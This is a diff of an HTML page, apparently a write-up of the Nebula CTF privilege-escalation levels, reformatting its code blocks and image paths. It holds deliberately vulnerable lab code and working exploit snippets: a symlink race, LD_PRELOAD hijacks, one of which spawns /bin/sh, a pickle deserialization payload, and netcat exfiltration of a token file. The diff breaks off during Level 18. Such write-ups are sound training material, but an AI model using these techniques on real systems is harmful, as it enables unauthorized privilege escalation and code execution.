@@ -5,7 +5,7 @@ title: Nebula
 
             <!-- Intro -->
             <section id="intro">
-                <img src="../../images/projects/nebula.jpg" width="100%" height="250px" />
+                <img src="/images/projects/nebula.jpg" width="100%" height="250px" />
                 <header class="major">
                     <h2>Nebula CTF</h2>
                 </header>
@@ -122,19 +122,17 @@ title: Nebula
                 <h3>Level 01</h3>
                 <h4>There is a vulnerability in the code stored in /home/flag01 that allows arbitrary programs to be executed</h4>
 
-                <pre class="brush: c">
-                    int main(int argc, char **argv, char **envp){
-                      gid_t gid;
-                      uid_t uid;
-                      gid = getegid();
-                      uid = geteuid();
+                <pre><code class="cpp">int main(int argc, char **argv, char **envp){
+    gid_t gid;
+    uid_t uid;
+    gid = getegid();
+    uid = geteuid();
 
-                      setresgid(gid, gid, gid);
-                      setresuid(uid, uid, uid);
+    setresgid(gid, gid, gid);
+    setresuid(uid, uid, uid);
 
-                      system("/usr/bin/env echo and now what?");
-                    }
-                </pre>
+    system("/usr/bin/env echo and now what?");
+}</code></pre>
 
                 <blockquote>
                     <b>int system(const char *command):</b> the C library function system() takes as parameter a string containing the name of a requested variable. This variable, that can be a command or program name, is passed to the host environment to be executed. The function returns after the command has been completed.
@@ -175,27 +173,25 @@ title: Nebula
                 <h3>Level 02</h3>
                 <h4>There is a vulnerability in the code stored in /home/flag02 that allows arbitrary programs to be executed</h4>
                 
-                <pre class="brush: c">
-                    int main(int argc, char **argv, char **envp){
-                      char *buffer;
+                <pre><code class="cpp">int main(int argc, char **argv, char **envp){
+    char *buffer;
 
-                      gid_t gid;
-                      uid_t uid;
+    gid_t gid;
+    uid_t uid;
 
-                      gid = getegid();
-                      uid = geteuid();
+    gid = getegid();
+    uid = geteuid();
 
-                      setresgid(gid, gid, gid);
-                      setresuid(uid, uid, uid);
+    setresgid(gid, gid, gid);
+    setresuid(uid, uid, uid);
 
-                      buffer = NULL;
+    buffer = NULL;
 
-                      asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
-                      printf("about to call system(\"%s\")\n", buffer);
-                      
-                      system(buffer);
-                    }
-                </pre>
+    asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
+    printf("about to call system(\"%s\")\n", buffer);
+    
+    system(buffer);
+}</code></pre>
                 
                 <blockquote>
                     <b>int asprintf(char **strp, const char *fmt, ...):</b> the C library function asprintf() is a print method that takes care of allocation: it calculates the length of the string, allocates that amount of memory, and writes the string into it. The pointer to this allocated memory is returned via the first argument, while the second argument is the string to be printed.<br>
@@ -248,15 +244,13 @@ title: Nebula
                         We look at the files in the <i>/home/flag03</i> folder. There is an empty subfolder and a shell script that when called will run all scripts that are stored in the currently empty folder <code>ulimit -t 5; bash -x "$i"</code>, and then delete the finished script <code>rm -f "$i"</code>.
                     </li>
                     <li>To check if the crontab will give the SUID permissions to the scripts in the target folder, we can create a script that will return different values depending on the running permissions. This is what we want to <i>echo</i> in our output file:
-                        <pre class="brush: sh">
-                            #!/bin/bash
-                            if [ "$EUID" -ne 0]
-                                then echo "Please root me!"
-                                else echo "I am GROOT!"
-                                exit
-                            fi
-                            >> /tmp/root
-                        </pre>
+                        <pre><code class="bash">#!/bin/bash
+if [ "$EUID" -ne 0]
+    then echo "Please root me!"
+    else echo "I am GROOT!"
+    exit
+fi
+>> /tmp/root</code></pre>
                     </li>
                     <li>
                         After the cronjob run, we can check the result in <i>/tmp/root</i>. The result will depend on the effective user running the script, corresponding to <i>$EUID</i>. If <i>$EUID</i> is root, its value will be 0, therefore our file will contain "I am GROOT!". This is what we will find in our output file, and with this we know that the scripts are really run with SUID.
@@ -282,35 +276,33 @@ title: Nebula
                 <h3>Level 04</h3>
                 <h4>Read the token file bypassing the restrictions in the code.</h4>
                 
-                <pre class="brush: c">
-                    int main(int argc, char **argv, char **envp){
-                      char buf[1024];
-                      int fd, rc;
+                <pre><code class="cpp">int main(int argc, char **argv, char **envp){
+    char buf[1024];
+    int fd, rc;
 
-                      if(argc == 1) {
-                          printf("%s [file to read]\n", argv[0]);
-                          exit(EXIT_FAILURE);
-                      }
+    if(argc == 1) {
+        printf("%s [file to read]\n", argv[0]);
+        exit(EXIT_FAILURE);
+    }
 
-                      if(strstr(argv[1], "token") != NULL) {
-                          printf("You may not access '%s'\n", argv[1]);
-                          exit(EXIT_FAILURE);
-                      }
+    if(strstr(argv[1], "token") != NULL) {
+        printf("You may not access '%s'\n", argv[1]);
+        exit(EXIT_FAILURE);
+    }
 
-                      fd = open(argv[1], O_RDONLY);
-                      if(fd == -1) {
-                          err(EXIT_FAILURE, "Unable to open %s", argv[1]);
-                      }
+    fd = open(argv[1], O_RDONLY);
+    if(fd == -1) {
+        err(EXIT_FAILURE, "Unable to open %s", argv[1]);
+    }
 
-                      rc = read(fd, buf, sizeof(buf));
-                      
-                      if(rc == -1) {
-                          err(EXIT_FAILURE, "Unable to read fd %d", fd);
-                      }
+    rc = read(fd, buf, sizeof(buf));
+    
+    if(rc == -1) {
+        err(EXIT_FAILURE, "Unable to read fd %d", fd);
+    }
 
-                      write(1, buf, rc);
-                    }
-                </pre>
+    write(1, buf, rc);
+}</code></pre>
                 
                 <blockquote>
                     <b>char *strstr(const char *str1, const char *str2):</b> the function returns a pointer to the first occurrence of str2 in str1, or a null pointer if str2 is not part of str1. The matching process does not include the terminating null-characters, but it stops there.
@@ -378,7 +370,7 @@ title: Nebula
                 <blockquote>
                     <b>/etc/passwd:</b> this text file stores login informations about each user in the system. There is one line for each user, and each entry is made by seven values separated by columns.<br>
                     <div align="center">
-                        <img src="../../images/projects/nebula/passwd.png" width="500px">
+                        <img src="/images/projects/nebula/passwd.png" width="500px">
                     </div>
                     <ol>
                         <li>Username: used when user logs in.</li>
@@ -395,7 +387,7 @@ title: Nebula
                 <blockquote>
                     <b>/etc/shadow:</b> a text file where actual passwords (and additional informations) are stored in encrypted format. As in /etc/passwd, there is one entry per each user, one per line.<br>
                     <div align="center">
-                        <img src="../../images/projects/nebula/shadow.png" width="500px">
+                        <img src="/images/projects/nebula/shadow.png" width="500px">
                     </div>
                     <ol>
                         <li>Username : login name.</li>
@@ -440,24 +432,22 @@ title: Nebula
                 <h3>Level 07</h3>
                 <h4>Perl program allowing to ping to check for reachability from a webserver.</h4>
                 
-                <pre class="brush: perl">
-                    #!/usr/bin/perl
-                    use CGI qw{param};
+                <pre><code class="perl">#!/usr/bin/perl
+use CGI qw{param};
 
-                    print "Content-type: text/html\n\n";
+print "Content-type: text/html\n\n";
 
-                    sub ping {
-                      $host = $_[0];
+sub ping {
+    $host = $_[0];
 
-                      print("Ping results");
+    print("Ping results");
 
-                      @output = `ping -c 3 $host 2>&1`;
-                      foreach $line (@output) { print "$line"; }
-                    }
+    @output = `ping -c 3 $host 2>&1`;
+    foreach $line (@output) { print "$line"; }
+}
 
-                    # check if Host set. if not, display normal page, etc
-                    ping(param("Host"));
-                </pre>
+# check if Host set. if not, display normal page, etc
+ping(param("Host"));</code></pre>
 
                 <ol>
                     <li>
@@ -500,28 +490,26 @@ title: Nebula
                 <h3>Level 09</h3>
                 <h4>C setuid wrapper for vulnerable PHP code.</h4>
                 
-                <pre class="brush: php">
-                    function spam($email){
-                      $email = preg_replace("/\./", " dot ", $email);
-                      $email = preg_replace("/@/", " AT ", $email);
-                      
-                      return $email;
-                    }
+                <pre><code class="html">function spam($email){
+    $email = preg_replace("/\./", " dot ", $email);
+    $email = preg_replace("/@/", " AT ", $email);
+    
+    return $email;
+}
 
-                    function markup($filename, $use_me){
-                      $contents = file_get_contents($filename);
+function markup($filename, $use_me){
+    $contents = file_get_contents($filename);
 
-                      $contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
-                      $contents = preg_replace("/\[/", "<", $contents);
-                      $contents = preg_replace("/\]/", ">", $contents);
+    $contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
+    $contents = preg_replace("/\[/", "&lt;", $contents);
+    $contents = preg_replace("/\]/", "&gt;", $contents);
 
-                      return $contents;
-                    }
+    return $contents;
+}
 
-                    $output = markup($argv[1], $argv[2]);
+$output = markup($argv[1], $argv[2]);
 
-                    print $output;
-                </pre>
+print $output;</code></pre>
 
                 <blockquote>
                     <b>string file_get_contents(string $filename):</b> reads entire file into a string, and returns the file in a string, starting at the specified offset up to maxlen bytes. On failure, it will return FALSE.
@@ -552,69 +540,67 @@ title: Nebula
                 <h3>Level 10</h3>
                 <h4>The binary uploads any file, as long as it meets the requirements of the access() system call.</h4>
                 
-                <pre class="brush: c">
-                    int main(int argc, char **argv){
-                      char *file;
-                      char *host;
+                <pre><code class="cpp">int main(int argc, char **argv){
+    char *file;
+    char *host;
 
-                      if(argc < 3) {
-                          printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
-                          exit(1);
-                      }
+    if(argc &lt; 3) {
+        printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
+        exit(1);
+    }
 
-                      file = argv[1];
-                      host = argv[2];
+    file = argv[1];
+    host = argv[2];
 
-                      if(access(argv[1], R_OK) == 0) {
-                          int fd;
-                          int ffd;
-                          int rc;
-                          struct sockaddr_in sin;
-                          char buffer[4096];
+    if(access(argv[1], R_OK) == 0) {
+        int fd;
+        int ffd;
+        int rc;
+        struct sockaddr_in sin;
+        char buffer[4096];
 
-                          printf("Connecting to %s:18211 .. ", host); fflush(stdout);
+        printf("Connecting to %s:18211 .. ", host); fflush(stdout);
 
-                          fd = socket(AF_INET, SOCK_STREAM, 0);
+        fd = socket(AF_INET, SOCK_STREAM, 0);
 
-                          memset(&sin, 0, sizeof(struct sockaddr_in));
-                          sin.sin_family = AF_INET;
-                          sin.sin_addr.s_addr = inet_addr(host);
-                          sin.sin_port = htons(18211);
+        memset(&sin, 0, sizeof(struct sockaddr_in));
+        sin.sin_family = AF_INET;
+        sin.sin_addr.s_addr = inet_addr(host);
+        sin.sin_port = htons(18211);
 
-                          if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) {
-                              printf("Unable to connect to host %s\n", host);
-                              exit(EXIT_FAILURE);
-                          }
+        if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) {
+            printf("Unable to connect to host %s\n", host);
+            exit(EXIT_FAILURE);
+        }
 
-                    #define HITHERE ".oO Oo.\n"
-                          if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
-                              printf("Unable to write banner to host %s\n", host);
-                              exit(EXIT_FAILURE);
-                          }
-                    #undef HITHERE
+#define HITHERE ".oO Oo.\n"
+        if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
+            printf("Unable to write banner to host %s\n", host);
+            exit(EXIT_FAILURE);
+        }
+#undef HITHERE
 
-                          printf("Connected!\nSending file .. "); fflush(stdout);
+        printf("Connected!\nSending file .. "); fflush(stdout);
 
-                          ffd = open(file, O_RDONLY);
-                          if(ffd == -1) {
-                              printf("Damn. Unable to open file\n");
-                              exit(EXIT_FAILURE);
-                          }
+        ffd = open(file, O_RDONLY);
+        if(ffd == -1) {
+            printf("Damn. Unable to open file\n");
+            exit(EXIT_FAILURE);
+        }
 
-                          rc = read(ffd, buffer, sizeof(buffer));
-                          if(rc == -1) {
-                              printf("Unable to read from file: %s\n", strerror(errno));
-                              exit(EXIT_FAILURE);
-                          }
+        rc = read(ffd, buffer, sizeof(buffer));
+        if(rc == -1) {
+            printf("Unable to read from file: %s\n", strerror(errno));
+            exit(EXIT_FAILURE);
+        }
 
-                          write(fd, buffer, rc);
-                          printf("wrote file!\n");
+        write(fd, buffer, rc);
+        printf("wrote file!\n");
 
-                      } else {
-                          printf("You don't have access to %s\n", file);
-                      }
-                    }
-                </pre>
+    } else {
+        printf("You don't have access to %s\n", file);
+    }
+}</code></pre>
                 
                 <blockquote>
                     <b>int access(const char *pathname, int mode):</b> check real user's permissions for a file, or whether the calling process can access the file pathname. If pathname is a symbolic link, it is dereferenced. The check uses the calling process's real UID and GID, rather than the effective IDs. On success it returns 0, on error -1 is returned, and errno is set appropriately.
@@ -637,14 +623,12 @@ title: Nebula
                     </li>
                     <li>
                         To exploit the bug we have to create a race condition. To do this we create a loop that constantly swaps the real file with a fake file using symlinks: by executing the flag10 program multiple times we hope that at some point we will be lucky and run it with the perfect timing so that the <i>access()</i> tests the real file and the <i>open()</i> gets the swapped file. We create the loop in a bash file:
-                        <pre class="brush: sh">
-                            #!/bin/bash
-                            while true
-                            do
-                                ln -sf /home/flag10/token /tmp/swaptok
-                                ln -sf /tmp/ncTest /tmp/swaptok
-                            done
-                        </pre>
+                        <pre><code class="bash">#!/bin/bash
+while true
+do
+    ln -sf /home/flag10/token /tmp/swaptok
+    ln -sf /tmp/ncTest /tmp/swaptok
+done</code></pre>
                     </li>
                     <li>
                         We run this file with <code>./loop.sh &</code>, where the & is needed to put the job in the background so that we can run someting else in the meantime. In our host we start netcat again, this time using the -k flag so that it will keep listening: <code>nc -lk 18211</code>. The last step is to run flag10 multiple times passing our symlink to it, until we manage to trigger the race condition. To do this, we use an inline loop (using a script form tmp folder would not work because we don't have read access): <code>while true; do ./flag10 /tmp/swaptok [IP of the host]; done;</code>
@@ -661,96 +645,93 @@ title: Nebula
                 <h3>Level 11</h3>
                 <h4>A binary processes standard input and executes a shell command.</h4>
                 
-                <pre class="brush: c">
-                    //Return a random, non predictable file, and return the file descriptor for it.
-                    int getrand(char **path){
-                      char *tmp;
-                      int pid;
-                      int fd;
+                <pre><code class="cpp">//Return a random, non predictable file, and return the file descriptor for it.
+int getrand(char **path){
+    char *tmp;
+    int pid;
+    int fd;
 
-                      srandom(time(NULL));
+    srandom(time(NULL));
 
-                      tmp = getenv("TEMP");
-                      pid = getpid();
-                      
-                      asprintf(path, "%s/%d.%c%c%c%c%c%c", tmp, pid,
-                          'A' + (random() % 26), '0' + (random() % 10),
-                          'a' + (random() % 26), 'A' + (random() % 26),
-                          '0' + (random() % 10), 'a' + (random() % 26));
+    tmp = getenv("TEMP");
+    pid = getpid();
+    
+    asprintf(path, "%s/%d.%c%c%c%c%c%c", tmp, pid,
+        'A' + (random() % 26), '0' + (random() % 10),
+        'a' + (random() % 26), 'A' + (random() % 26),
+        '0' + (random() % 10), 'a' + (random() % 26));
 
-                      fd = open(*path, O_CREAT|O_RDWR, 0600);
-                      unlink(*path);
-                      return fd;
-                    }
+    fd = open(*path, O_CREAT|O_RDWR, 0600);
+    unlink(*path);
+    return fd;
+}
 
-                    void process(char *buffer, int length){
-                      unsigned int key;
-                      int i;
+void process(char *buffer, int length){
+    unsigned int key;
+    int i;
 
-                      key = length & 0xff;
+    key = length & 0xff;
 
-                      for(i = 0; i < length; i++) {
-                          buffer[i] ^= key;
-                          key -= buffer[i];
-                      }
+    for(i = 0; i &lt; length; i++) {
+        buffer[i] ^= key;
+        key -= buffer[i];
+    }
 
-                      system(buffer);
-                    }
+    system(buffer);
+}
 
-                    #define CL "Content-Length: "
+#define CL "Content-Length: "
 
-                    int main(int argc, char **argv)
-                    {
-                      char line[256];
-                      char buf[1024];
-                      char *mem;
-                      int length;
-                      int fd;
-                      char *path;
+int main(int argc, char **argv)
+{
+    char line[256];
+    char buf[1024];
+    char *mem;
+    int length;
+    int fd;
+    char *path;
 
-                      if(fgets(line, sizeof(line), stdin) == NULL) {
-                          errx(1, "reading from stdin");
-                      }
+    if(fgets(line, sizeof(line), stdin) == NULL) {
+        errx(1, "reading from stdin");
+    }
 
-                      if(strncmp(line, CL, strlen(CL)) != 0) {
-                          errx(1, "invalid header");
-                      }
+    if(strncmp(line, CL, strlen(CL)) != 0) {
+        errx(1, "invalid header");
+    }
 
-                      length = atoi(line + strlen(CL));
-                      
-                      if(length < sizeof(buf)) {
-                          if(fread(buf, length, 1, stdin) != length) {
-                              err(1, "fread length");
-                          }
-                          process(buf, length);
-                      } else {
-                          int blue = length;
-                          int pink;
+    length = atoi(line + strlen(CL));
+    
+    if(length &lt; sizeof(buf)) {
+        if(fread(buf, length, 1, stdin) != length) {
+            err(1, "fread length");
+        }
+        process(buf, length);
+    } else {
+        int blue = length;
+        int pink;
 
-                          fd = getrand(&path);
+        fd = getrand(&path);
 
-                          while(blue > 0) {
-                              printf("blue = %d, length = %d, ", blue, length);
+        while(blue > 0) {
+            printf("blue = %d, length = %d, ", blue, length);
 
-                              pink = fread(buf, 1, sizeof(buf), stdin);
-                              printf("pink = %d\n", pink);
+            pink = fread(buf, 1, sizeof(buf), stdin);
+            printf("pink = %d\n", pink);
 
-                              if(pink <= 0) {
-                                  err(1, "fread fail(blue = %d, length = %d)", blue, length);
-                              }
-                              write(fd, buf, pink);
-                              blue -= pink;
-                          }    
+            if(pink &lt;= 0) {
+                err(1, "fread fail(blue = %d, length = %d)", blue, length);
+            }
+            write(fd, buf, pink);
+            blue -= pink;
+        }    
 
-                          mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
-                          if(mem == MAP_FAILED) {
-                              err(1, "mmap");
-                          }
-                          process(mem, length);
-                      }
-                    }
-
-                </pre>
+        mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
+        if(mem == MAP_FAILED) {
+            err(1, "mmap");
+        }
+        process(mem, length);
+    }
+}</code></pre>
                 
                 <blockquote>
                     <b>File descriptor:</b> an FD is a handle used to access a file or IO resources. It's a non-negative integer (negative values indicate "no value" or an error). Each Unix process (except perhaps a daemon) should expect to have three standard POSIX file descriptors, corresponding to the three standard streams: 0 for standard input, 1 for standard output and 2 for standard error. <br>
@@ -784,39 +765,37 @@ title: Nebula
                 <h3>Level 12</h3>
                 <h4>There is a backdoor process listening on port 50001.</h4>
                 
-                <pre class="brush: lua">
-                    local socket = require("socket")
-                    local server = assert(socket.bind("127.0.0.1", 50001))
+                <pre><code class="lua">local socket = require("socket")
+local server = assert(socket.bind("127.0.0.1", 50001))
 
-                    function hash(password)
-                      prog = io.popen("echo "..password.." | sha1sum", "r")
-                      data = prog:read("*all")
-                      prog:close()
+function hash(password)
+    prog = io.popen("echo "..password.." | sha1sum", "r")
+    data = prog:read("*all")
+    prog:close()
 
-                      data = string.sub(data, 1, 40)
+    data = string.sub(data, 1, 40)
 
-                      return data
-                    end
+    return data
+end
 
-                    while 1 do
-                      local client = server:accept()
-                      client:send("Password: ")
-                      client:settimeout(60)
-                      local line, err = client:receive()
-                      if not err then
-                          print("trying " .. line) -- log from where ;\
-                          local h = hash(line)
+while 1 do
+    local client = server:accept()
+    client:send("Password: ")
+    client:settimeout(60)
+    local line, err = client:receive()
+    if not err then
+        print("trying " .. line) -- log from where ;\
+        local h = hash(line)
 
-                          if h ~= "4754a4f4bd5787accd33de887b9250a0691dd198" then
-                              client:send("Better luck next time\n");
-                          else
-                              client:send("Congrats, your token is 413**CARRIER LOST**\n")
-                          end
-                      end
+        if h ~= "4754a4f4bd5787accd33de887b9250a0691dd198" then
+            client:send("Better luck next time\n");
+        else
+            client:send("Congrats, your token is 413**CARRIER LOST**\n")
+        end
+    end
 
-                      client:close()
-                    end
-                </pre>
+    client:close()
+end</code></pre>
                 
                 <ol>
                     <li>
@@ -837,24 +816,22 @@ title: Nebula
                 <h3>Level 13</h3>
                 <h4>A security check that prevents execution if the user invoking it does not match a specific user id.</h4>
                 
-                <pre class="brush: c">
-                    #define FAKEUID 1000
+                <pre><code class="cpp">#define FAKEUID 1000
 
-                    int main(int argc, char **argv, char **envp){
-                      int c;
-                      char token[256];
+int main(int argc, char **argv, char **envp){
+    int c;
+    char token[256];
 
-                      if(getuid() != FAKEUID) {
-                          printf("Security failure detected. UID %d started us, we expect %d\n", getuid(), FAKEUID);
-                          printf("The system administrators will be notified of this violation\n");
-                          exit(EXIT_FAILURE);
-                      }
+    if(getuid() != FAKEUID) {
+        printf("Security failure detected. UID %d started us, we expect %d\n", getuid(), FAKEUID);
+        printf("The system administrators will be notified of this violation\n");
+        exit(EXIT_FAILURE);
+    }
 
-                      // snip, sorry :)
+    // snip, sorry :)
 
-                      printf("your token is %s\n", token);
-                    }
-                </pre>
+    printf("your token is %s\n", token);
+}</code></pre>
                 
                 <blockquote><b>uid_t getuid(void):</b> the function returns the real user ID of the calling process.</blockquote>
                 <blockquote><b>LD_PRELOAD:</b> this is an optional environmental variable containing paths to shared libraries that the loader will load before any other shared library including the C runtime library. Functions from preloaded libraries will be used before others of the same name in later libraries. This enables library functions to be intercepted and replaced.
@@ -866,11 +843,7 @@ title: Nebula
                     </li>
                     <li>
                         We know that <i>getuid</i> is taken from a shared library, and therefore if we define LD_PRELOAD we should be able to overwrite it with a function with the same name but a different behavior. To do this we create a fakelib.c file with the following code:
-                        <pre class="brush: c">
-                            int getuid() {
-                                return 1000;
-                            }
-                        </pre>
+                        <pre><code class="cpp">int getuid() { return 1000; }</code></pre>
                     Compile this code using <code>gcc -shared -fPIC -o /home/level13/fake.so /home/level13/fake.c</code>. The <i>-shared -fPIC</i> arguments are for position independent code.
                     </li>
                     <li>
@@ -893,31 +866,27 @@ title: Nebula
                 <ol>
                     <li>
                         We run the flag14 program with the -e parameter, and we see that it reads the standard input and writes a modified output of the same length. Playing around a bit with inputs like "AAAAA" and "11111" shows that the encryption function is quite easy: to each element ASCII decimal value we add its position.
-                       <pre class="brush: python">
-                            def encr(e):
-                                r = []
-                                i = 0
-                                for c in e:
-                                    r.append(ord(c) + i)
-                                    i = i+1
-                                for el in r:
-                                    print(chr(el))
-                        </pre>
+                       <pre><code class="python">def encr(e):
+    r = []
+    i = 0
+    for c in e:
+        r.append(ord(c) + i)
+        i = i+1
+    for el in r:
+        print(chr(el))</code></pre>
                     </li>
                     <li>
                         To decrypt the text that is in the token file, we need to write the opposite function: instead of adding its position to each element, we subtract it. As we are moving backwards, we have to remember to reverse the resulting output before printing it:
-                        <pre class="brush: python">
-                            def decr(d):
-                                r = []
-                                s = []
-                                i = len(d)-1
-                                for c in d[::-1]:
-                                    r.append(ord(c) - i)
-                                    i = i-1
-                                for el in r[::-1]:
-                                    s.append(chr(el))
-                                print("".join(s))
-                        </pre>
+                        <pre><code class="python">def decr(d):
+    r = []
+    s = []
+    i = len(d)-1
+    for c in d[::-1]:
+        r.append(ord(c) - i)
+        i = i-1
+    for el in r[::-1]:
+        s.append(chr(el))
+    print("".join(s))</code></pre>
                     </li>
                     <li>
                         It's not the most elegant solution ever, but if we feed the content of the token file to the <i>decr()</i> method, the result will be the password for the flag14 user. At this point, it's enough to go with <i>su</i> to access the account and run <code>getflag</code>
@@ -948,11 +917,9 @@ title: Nebula
                     </li>
                     <li>
                         As we did in Level13, we create a fake.c file containing a fake implementation of <i>__libc_start_main</i>. Remember however to use the proper signature of the function, with the correct arguments and return type. The content of the function should be a call to <i>system()</i> to spawn a shell for us:
-                        <pre class="brush: c">
-                        int __libc_start_main(int *(main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {
-                            system("/bin/sh");
-                        }
-                        </pre>
+                        <pre><code class="cpp">int __libc_start_main(int *(main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {
+    system("/bin/sh");
+}</code></pre>
                     Then compile the file with <code>gcc -shared -fPIC -o /var/tmp/flag15/libc.so.6 /tmp/fake15.c</code> and try running flag15 again.
                     </li>
                     <li>
@@ -972,43 +939,41 @@ title: Nebula
                 <h3>Level 16</h3>
                 <h4>There is a perl script running on port 1616.</h4>
                 
-                <pre class="brush: perl">
-                    #!/usr/bin/env perl
+                <pre><code class="perl">#!/usr/bin/env perl
 
-                    use CGI qw{param};
-                    print "Content-type: text/html\n\n";
+    use CGI qw{param};
+    print "Content-type: text/html\n\n";
 
-                    sub login {
-                      $username = $_[0];
-                      $password = $_[1];
+    sub login {
+        $username = $_[0];
+        $password = $_[1];
 
-                      $username =~ tr/a-z/A-Z/; # conver to uppercase
-                      $username =~ s/\s.*//;        # strip everything after a space
+        $username =~ tr/a-z/A-Z/; # conver to uppercase
+        $username =~ s/\s.*//;        # strip everything after a space
 
-                      @output = `egrep "^$username" /home/flag16/userdb.txt 2>&1`;
-                      foreach $line (@output) {
-                          ($usr, $pw) = split(/:/, $line);
-                      
-                          if($pw =~ $password) {
-                              return 1;
-                          }
-                      }
+        @output = `egrep "^$username" /home/flag16/userdb.txt 2>&1`;
+        foreach $line (@output) {
+            ($usr, $pw) = split(/:/, $line);
+        
+            if($pw =~ $password) {
+                return 1;
+            }
+        }
 
-                      return 0;
-                    }
+        return 0;
+    }
 
-                    sub htmlz {
-                      print("Login resuls");
-                      if($_[0] == 1) {
-                          print("Your login was accepted");
-                      } else {
-                          print("Your login failed");
-                      }    
-                      print("Would you like a cookie?\n");
-                    }
+    sub htmlz {
+        print("Login resuls");
+        if($_[0] == 1) {
+            print("Your login was accepted");
+        } else {
+            print("Your login failed");
+        }    
+        print("Would you like a cookie?\n");
+    }
 
-                    htmlz(login(param("username"), param("password")));
-                </pre>
+    htmlz(login(param("username"), param("password")));</code></pre>
 
                 <blockquote><b>egrep:</b> this command searches for a pattern using extended regular expressions, and returns all the lines matching that pattern.</blockquote>
                 <blockquote><b>Netcat:</b> invoked also with the simple command <i>nc</i>, Netcat is a networking tool for reading from and writing to connections using TCP or UDP. As in Level10, we can use it as a listener waiting for incoming connections.
@@ -1042,35 +1007,33 @@ title: Nebula
                 <h3>Level 17</h3>
                 <h4>There is a python script listening on port 10007 that contains a vulnerability.</h4>
                 
-                <pre class="brush: python">
-                    import os
-                    import pickle
-                    import time
-                    import socket
-                    import signal
+                <pre><code class="python">import os
+import pickle
+import time
+import socket
+import signal
 
-                    signal.signal(signal.SIGCHLD, signal.SIG_IGN)
+signal.signal(signal.SIGCHLD, signal.SIG_IGN)
 
-                    def server(skt):
-                      line = skt.recv(1024)
+def server(skt):
+    line = skt.recv(1024)
 
-                      obj = pickle.loads(line)
+    obj = pickle.loads(line)
 
-                      for i in obj:
-                          clnt.send("why did you send me " + i + "?\n")
+    for i in obj:
+        clnt.send("why did you send me " + i + "?\n")
 
-                    skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
-                    skt.bind(('0.0.0.0', 10007))
-                    skt.listen(10)
+skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
+skt.bind(('0.0.0.0', 10007))
+skt.listen(10)
 
-                    while True:
-                      clnt, addr = skt.accept()
+while True:
+    clnt, addr = skt.accept()
 
-                      if(os.fork() == 0):
-                          clnt.send("Accepted connection from %s:%d" % (addr[0], addr[1]))
-                          server(clnt)
-                          exit(1)
-                </pre>
+    if(os.fork() == 0):
+        clnt.send("Accepted connection from %s:%d" % (addr[0], addr[1]))
+        server(clnt)
+        exit(1)</code></pre>
 
                 <blockquote><b>
                 pickle.loads(string):</b> read a pickled object hierarchy from a string. Characters in the string past the pickled object’s representation are ignored. The pickle module is not intended to be secure against erroneous or maliciously constructed data.<br>
@@ -1081,33 +1044,29 @@ title: Nebula
                     We can see that our input will be passed unsanitized to a <i>pickle.loads()</i> instruction. After a quick research it is clear that pickle is vulnerable to crafted inputs because it will call whatever will be passed to it. That's what we want to exploit.
                     </li>
                     <li>The command to be run is pretty simple, and it's saved in a bash file that is called flag17 and that has executable permissions (chmod +x):
-                        <pre class="brush: sh">
-                            #!/bin/bash
-                            /bin/getflag >> /tmp/flag17.out
-                        </pre>
+                        <pre><code class="bash">#!/bin/bash
+/bin/getflag >> /tmp/flag17.out</code></pre>
                     </li>
                     <li>
                     To be successful in our exploit we have to rewrite the __reduce__ method so that when invoked it will run the flag17 script for us. Also, we want our method to be sent to the local server so that it will actually execute. For this we write a small python program that implements __reduce__, opens a socket connection to the server and sends our specially crafted object. Remember to not call this file pickly.py or any name that could cause confusion with libraries.
-                        <pre class="brush: python">
-                            import pickle
-                            import subprocess
-                            import socket
+                        <pre><code class="python">import pickle
+import subprocess
+import socket
 
-                            class Exploit(object):
-                            
-                                def __reduce__(self):
-                                    return(subprocess.Popen, (('/tmp/flag17',),))
-                            
-                            host = "127.0.0.1"
-                            port = 10007
-                            
-                            obj = pickle.dumps(Exploit())
-                            
-                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                            s.connect((host,port))
-                            s.send(obj)
-                            s.close()
-                        </pre>
+class Exploit(object):
+
+    def __reduce__(self):
+        return(subprocess.Popen, (('/tmp/flag17',),))
+
+host = "127.0.0.1"
+port = 10007
+
+obj = pickle.dumps(Exploit())
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host,port))
+s.send(obj)
+s.close()</code></pre>
                     </li>
                     <li>
                     Execute the python file, and after succesfully sending our packet we can check in /tmp/flag17.out and we will find that <code>getflag</code> has been successfully executed for us.
@@ -1121,115 +1080,113 @@ title: Nebula
                 <h3>Level 18</h3>
                 <h4>Analyse the C program, and look for vulnerabilities in the program.</h4>
                 
-                <pre class="brush: c">
-                    struct {
-                      FILE *debugfile;
-                      int verbose;
-                      int loggedin;
-                    } globals;
+                <pre><code class="cpp">struct {
+    FILE *debugfile;
+    int verbose;
+    int loggedin;
+} globals;
 
-                    #define dprintf(...) if(globals.debugfile) \
-                      fprintf(globals.debugfile, __VA_ARGS__)
-                    #define dvprintf(num, ...) if(globals.debugfile && globals.verbose >= num) \
-                      fprintf(globals.debugfile, __VA_ARGS__)
+#define dprintf(...) if(globals.debugfile) \
+    fprintf(globals.debugfile, __VA_ARGS__)
+#define dvprintf(num, ...) if(globals.debugfile && globals.verbose >= num) \
+    fprintf(globals.debugfile, __VA_ARGS__)
 
-                    #define PWFILE "/home/flag18/password"
+#define PWFILE "/home/flag18/password"
 
-                    void login(char *pw){
-                      FILE *fp;
+void login(char *pw){
+    FILE *fp;
 
-                      fp = fopen(PWFILE, "r");
-                      if(fp) {
-                          char file[64];
